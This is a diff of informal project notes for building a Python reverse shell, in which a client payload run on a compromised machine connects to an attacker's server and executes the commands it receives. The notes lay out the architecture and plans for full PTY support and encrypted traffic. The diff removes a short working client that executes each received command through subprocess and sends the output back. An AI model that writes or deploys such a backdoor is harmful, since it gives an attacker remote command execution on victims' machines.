@@ -1,34 +1,72 @@
-Layout: An attacker uses command execution from the target box to execute the client payload. 
-
-The client payload connect to a malicious server on port x.
-
-The attacking server listens on port x for the clients connection, once recieved the connection is bound and occupies port x. 
-
-The attacking server establishes and maintains that connection by creating a socket, binding to a port and listening for a connection to come through. 
-
-Commands are transmit from server to client over the wire by encoded bytes. Once recieved on client-side, they are decoded to data-type string. 
-
-The client payload listens for the server commands and executes them in string format using a while loop with hardcoded commands and their functionality. It uses it's own subprocess to do so.
-
+Layout of Program: 
+• An attacker uses command execution from the target box to execute the client payload. 
+• The client payload connect to a malicious server on port x.
+• The attacking server listens on port x for the clients connection, once recieved the connection is bound and occupies port x. 
+• The attacking server establishes and maintains that connection by creating a socket, binding to a port and listening for a connection to come through. 
+• Commands are transmit from server to client over the wire by encoded bytes. Once recieved on client-side, they are decoded to data-type string. 
+• The client payload listens for the server commands and executes them in string format using a while loop with hardcoded commands and their functionality. It does so using its own subprocess.
 
 
 
 TLDR: Sever & Client maintain a connection, server sends requests, client executes requests with hardcoded functionality within its local payload.
-================================
-What else do we need to do & what is actually needed:
+=================================================================================================================================================================================
+What else do we need to do:
 
-- full pty capabilites (copp)
+- full pty capabilites 
+- shell encryption 
+- testing
+=================================================================================================================================================================================
+
+Full PTY capabilites:
+(copp)
+commands, usage functionality, error handling, (google everything needed for a good pty shell), (figure out the inner workings of a fully functional PTY shell)
+- Our own Subprocess for executing commands
+- full pty capabilites 
 	client side:
 	commands, usage functionality, error handling, (google everything needed for a good pty shell), (figure out the inner workings of a fully functional PTY shell)
 	- Our own Subprocess for executing commands
 
-- shell encryption (future ting, google a bit tho)
-- testing
+SubProcess Section:
+-------------------
+their subprocess how it works:
+opens cmd
+shows input and output of bytes
+read and write
+some command error handling
+(basically how the cmd works. pre-built bash shell everyone uses.)
+
+
+
+So to create our own sub process we need to build our own package of commands.
+lets use a template as we'll be building so many commands:
+if command = ...
+	os.chdir(command[...])
+	execute
+	print results
+
+
+
+each time an command is input the program will scan over every if statement. This may be a better way to do it but idk:
+array_commands[cd, ls, ..., ...,]
+if argv1 = array_commands, value = True
+else exit()
+
+
+
+understand the inner workings of a shell:
+...
+
+=================================================================================================================================================================================
+- shell encryption 
+(future ting, google a bit tho)
 
 
 
 
-=================================
+
+
+
+=================================================================================================================================================================================
 Playzone:
 
 
@@ -46,39 +84,16 @@ We really need to understand the inner workings of an actual shell and how to in
 
 Shell development:
 	maybe use bash shell and personaly improve its functionality. 
-	<possibly>
+	<possibly but naw.>
 	we have errors in our shell which need to be fixed to make it fully pty compatible 
 	<Do some testing>
 
--------------------------------
-Subprocess stuffs:
-import socket
-import os
-import subprocess
-#1
-target_host = ""
-target_port = 99
-#2
-client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-client.connect((target_host,target_port))
-#3
-while True:
-    data = client.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
-        output_bytes = cmd.stdout.read()
-        output_str = str(output_bytes, "utf-8")
-        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
-        #print(output_str)
-client.close()
 
 
 
-----------------------------------
--------------------------------------------------------------------------------------------
-New:
+=================================================================================================================================================================================
+=================================================================================================================================================================================
+Old:
 Create a reliable network program to send data between a network sender and listener (reverse shell)
 
 Create a network Socket 
@@ -109,10 +124,6 @@ Client-Sever:
   • Currently building both the client functionality & the python sever - (Reference & base code) -  https://www.thepythoncode.com/code/create-reverse-shell-python
   • Most of the PoC done, once error handling is complete.
   • Subprocess work to do.
-   
-============================================================================================================================
-Old:
-
 ============================================================================================================================
 Older:
   
